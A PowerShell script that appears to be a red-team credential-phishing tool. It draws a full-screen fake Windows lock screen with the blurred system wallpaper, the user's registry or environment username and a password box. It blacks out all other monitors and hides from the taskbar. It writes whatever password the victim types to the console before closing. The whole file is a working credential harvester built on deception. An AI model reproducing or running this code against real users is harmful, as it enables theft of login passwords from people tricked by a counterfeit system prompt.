[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

[xml]$xaml = @"
<Window
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    x:Name="Window"
    Title="SL" Height="768" Width="1024" ShowInTaskbar="False" WindowStyle="None" Topmost="True" WindowState="Maximized" Background="#FF323232">

    <Grid ZIndex="0">
        <Grid ZIndex="1">
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width="1*" />
                <ColumnDefinition Width="Auto" />
                <ColumnDefinition Width="1*" />
            </Grid.ColumnDefinitions>
            <Grid.RowDefinitions>
                <RowDefinition Height="1*" />
                <RowDefinition Height="Auto" />
                <RowDefinition Height="1*" />
            </Grid.RowDefinitions>

            <!-- User Profile Image -->
            <StackPanel Grid.Column="1" Grid.Row="1" VerticalAlignment="Center">
                <Ellipse Width="200" Height="200" Name="Avatar">
                    <Ellipse.Fill>
                        <ImageBrush>
                        </ImageBrush>
                    </Ellipse.Fill>
                </Ellipse>
                <Label Name="Username" Content="User" HorizontalAlignment="Center" FontSize="46" Margin="10" Foreground="White" FontFamily="Segoe UI Light"/>
                

                <DockPanel Width="280" Height="30" Margin="10">
                    <Button Name="PasswordButton" BorderThickness="2" FontSize="15" DockPanel.Dock="Right" Content="&#xE72A;"  Width="30" FontFamily="Segoe MDL2 Assets" Foreground="White" BorderBrush="White" Background="#FFBEBEBE" />
                    <PasswordBox Name="PasswordText" FontSize="16" VerticalAlignment="Center" BorderThickness="0" DockPanel.Dock="Left" Height="30" VerticalContentAlignment="Center" Padding="5,0,0,0" />
                </DockPanel>


                <Label Name="ErrorMessage" Content="The password is incorrect. Try again." HorizontalAlignment="Center" FontSize="14" Margin="10,10,10,50" Foreground="White" FontFamily="Segoe UI Semibold" Visibility="Hidden" />
            </StackPanel>

            <!-- Buttons Panel -->
            <StackPanel Grid.Row="2" Grid.Column="2" Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Bottom" Margin="0,0,25,25" Height="50">
                <Button Content="&#xE701;" FontFamily="Segoe MDL2 Assets" Foreground="White" Width="Auto" Height="Auto" FontSize="30" Grid.Column="0" Margin="2" Background="{x:Null}" BorderBrush="{x:Null}" />
                <Button Content="&#xE776;" FontFamily="Segoe MDL2 Assets" Foreground="White"  Width="Auto" Height="Auto" FontSize="30" Grid.Column="1" Margin="2" Background="{x:Null}" BorderBrush="{x:Null}" />
                <Button Content="&#xE7E8;" FontFamily="Segoe MDL2 Assets" Foreground="White"  Width="Auto" Height="Auto" FontSize="30" Grid.Column="2" Margin="2" Background="{x:Null}" BorderBrush="{x:Null}" />
            </StackPanel>
            
        </Grid>
        <!-- Background Image with Blur -->
        <Border>
            <Image Source="$env:WINDIR\Web\Screen\img103.png" Stretch="Fill" />
            <Border.Effect>
                <BlurEffect KernelType="Gaussian" Radius="40"/>
            </Border.Effect>
        </Border>
        
    </Grid>

</Window>

"@

[xml]$xamlBlack = @"
<Window
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="BlackWindow" Height="450" Width="800" Topmost="True" ShowInTaskbar="False" Background="Black" WindowStyle="None">
    <Grid>    
    </Grid>
</Window>
"@

Add-Type -AssemblyName PresentationFramework
$reader = (New-Object System.Xml.XmlNodeReader $xaml)
$window = [Windows.Markup.XamlReader]::Load($reader)

# Handle events
$button = $window.FindName("PasswordButton")
$message = $window.FindName("ErrorMessage")
$button.Add_Click{
    onClick
}

$password = $window.FindName("PasswordText")
$password.Add_KeyDown{
    param
    (
      [Parameter(Mandatory)][Object]$sender,
      [Parameter(Mandatory)][Windows.Input.KeyEventArgs]$e
    )
    if($e.Key -eq 'Enter')
    {
        onClick
    }
}

# Load default avatar image
$base64 = ""
$bitmap = New-Object System.Windows.Media.Imaging.BitmapImage
$bitmap.BeginInit()
$bitmap.StreamSource = [System.IO.MemoryStream][System.Convert]::FromBase64String($base64)
$bitmap.EndInit()
$bitmap.Freeze()
$brush = [System.Windows.Media.ImageBrush]::New($bitmap)
$avatar = $window.FindName("Avatar")
$avatar.Fill = $brush

# Get username
$userLabel = $window.FindName("Username")
try {
    $userLabel.Content = Get-ItemPropertyValue -Path HKCU:\SOFTWARE\Microsoft\office\Common\UserInfo\ -name UserName -ErrorAction Stop
}
catch {
    $userLabel.Content = $env:UserName
}


# Black other screens
$screens = [System.Windows.Forms.Screen]::AllScreens
$blacks = @()
for ($i=1; $i -lt $screens.Length; $i++) {
    $reader = (New-Object System.Xml.XmlNodeReader $xamlBlack)
    $windowBlack = [Windows.Markup.XamlReader]::Load($reader)
    $workingArea = $screens[$i].WorkingArea
    $windowBlack.Top = $workingArea.Top
    $windowBlack.Left = $workingArea.Left
    $windowBlack.Show()
    $windowBlack.WindowState = [System.Windows.WindowState]::Maximized
    $blacks += $windowBlack
}

function onClick() {
    #$message.Visibility = "Visible"
    Write-Host $password.Password
    $window.Close()
    ForEach ($w in $blacks) {
        $w.Close()
    }
}


$password.Focus()
$window.ShowDialog() | Out-Null